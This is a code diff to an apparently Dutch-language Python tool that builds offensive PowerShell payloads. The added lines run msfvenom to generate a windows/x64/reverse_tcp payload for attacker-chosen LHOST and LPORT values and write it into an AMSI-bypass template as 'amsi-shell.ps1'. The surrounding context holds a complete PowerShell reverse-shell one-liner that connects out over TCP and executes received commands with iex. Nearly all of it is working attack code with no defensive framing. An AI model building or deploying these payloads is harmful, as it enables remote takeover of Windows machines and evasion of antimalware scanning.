@@ -45,6 +45,11 @@ if result.returncode != 0:
 payload = result.stdout.decode("utf-8")
 
 
+print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating {bcolors.OKGREEN}payload windows/x64/reverse_tcp{bcolors.OKBLUE} for LHOST={bcolors.OKGREEN}{args.lhost}{bcolors.OKBLUE} and LPORT={bcolors.OKGREEN}{args.lport}{bcolors.ENDC}")
+result = subprocess.run(['msfvenom', '-p', 'windows/x64/reverse_tcp', f"LHOST={args.lhost}", f"LPORT={args.lport}", 'exitfunc=thread', "-f", "powershell"], stdout=subprocess.PIPE)
+
+payload2 = result.stdout.decode("utf-8")
+
 #hoaxshell varianten
 
 ps1 = '''$c = New-Object System.Net.Sockets.TCPClient('[ip]',[poort]);$s = $c.GetStream();[byte[]]$b = 0..65535|%%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$yolo = (iex $d 2>&1 | Out-String );$yolo = ([text.encoding]::ASCII).GetBytes($yolo + '#');$s.Write($yolo,0,$yolo.Length);$s.Flush()};$c.Close();'''
@@ -129,8 +134,7 @@ if args.bestand:
 
 template = lezen('meuk/template/amsi-bypass.ps1')
 schrijven('http/payloads/amsi-bypass.ps1', template.replace('[powershell]', payload))
+schrijven('http/payloads/amsi-shell.ps1', template.replace('[powershell]', payload2))
 
-
-if args.bestand:
-    tekst = lezen(args.bestand)
-    schrijven(bestand, tekst.replace('[powershellplaceholder]',uit1 + uit2))
+tekst = lezen(args.bestand)
+schrijven(args.bestand, tekst.replace('[powershellplaceholder]',uit1 + uit2))
